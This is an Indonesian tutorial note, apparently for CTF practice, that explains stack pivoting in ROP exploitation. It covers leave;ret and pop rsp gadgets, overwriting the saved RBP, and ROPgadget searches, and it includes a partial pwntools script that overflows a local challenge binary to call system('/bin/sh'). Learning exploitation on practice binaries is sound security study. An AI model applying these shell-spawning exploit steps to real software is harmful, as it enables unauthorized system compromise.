#cybersecurity

Stack pivot adalah teknik **memindahkan RSP (stack pointer) ke tempat lain** - biasanya ke memory yang lebih luas dan kita kontrol (`.bss`, heap). Dipakai saat ruang payload di stack terlalu kecil untuk ROP chain.

## Kenapa perlu pivot?

- Buffer kecil: payload cuma muat 40 byte, tapi chain butuh 200 byte
- Ada `read(0, buf, besar)` ke .bss tapi tidak ada overflow besar di stack
- Kita bisa menulis banyak ke tempat lain, tinggal "pindahkan" stack ke sana

## Gadget kunci

```asm
leave ; ret    ; mov rsp, rbp ; pop rbp ; ret
```

`leave` = `mov rsp, rbp` + `pop rbp` - menggeser stack ke nilai RBP lama.

## Cara 1: pivot via saved RBP

```
1. Tulis ROP chain lengkap di .bss (lewat read)
2. Timpa saved RBP dengan alamat chain (bss)
3. Timpa return address dengan leave;ret
4. Saat ret -> leave;ret jalan:
   rsp = rbp = bss   (stack pindah ke bss!)
   lalu ret -> gadget pertama chain
```

```python
from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")

offset = 72
leave_ret = 0x40101f   # gadget leave; ret
bss = elf.bss()        # alamat .bss

# Stage 1: tulis chain ke bss
rop = ROP(elf)
rop.system(next(elf.search(b"/bin/sh")))
chain = rop.chain()

payload1 = b"A"*offset + p64(bss) + p64(leave_ret)
io.sendlineafter(b": ", payload1)
io.sendline(chain)     # ditulis ke mana? sesuai bug program

# Stage 2 (versi yang membaca chain lewat read di dalam program):
# payload = b"A"*offset + p64(bss) + p64(leave_ret)
```

Catatan: skema persisnya tergantung struktur program (apakah ada read kedua, dst).

## Cara 2: pivot dengan xchg / add rsp

Gadget lain yang bisa pivot:

```asm
xchg rsp, rax ; ret     ; kalau rax bisa diisi alamat
add rsp, 0x?? ; ret     ; geser stack sedikit
pop rsp ; ret           ; langsung set rsp dari stack
```

## Alur khas challenge "pivot"

```
1. Program: read(0, buf_kecil, 40) di stack  -> hanya muat pivot
   dan read(0, tempat_besar, 200)            -> chain di .bss/heap
2. Susun:
   - tulis chain ke tempat_besar (heap/bss)
   - payload stack: offset + p64(tempat_besar) + p64(leave_ret)
3. leave;ret -> rsp = tempat_besar -> chain jalan
```

## Syarat

1. Ada `leave; ret` (hampir selalu ada di epilogue fungsi)
2. Tempat tujuan writable & executable-free (bss aman untuk ROP)
3. Alamat tempat tujuan diketahui (bss tetap kalau no PIE; kalau PIE, leak dulu)

## Mencari gadget

```bash
ROPgadget --binary chall | grep -E "leave|pop rsp"
# 0x000000000040101c : leave ; ret
```

## Catatan

- Pivot dipakai juga untuk memindahkan stack ke area yang lebih aman sebelum SROP/ret2dlresolve.
- Kalau `rbp` tidak kita kontrol (fungsi tidak pakai frame pointer), cari gadget pivot lain (`pop rsp; ret`).
- `.bss` bisa diisi "/bin/sh" juga - hemat langkah.
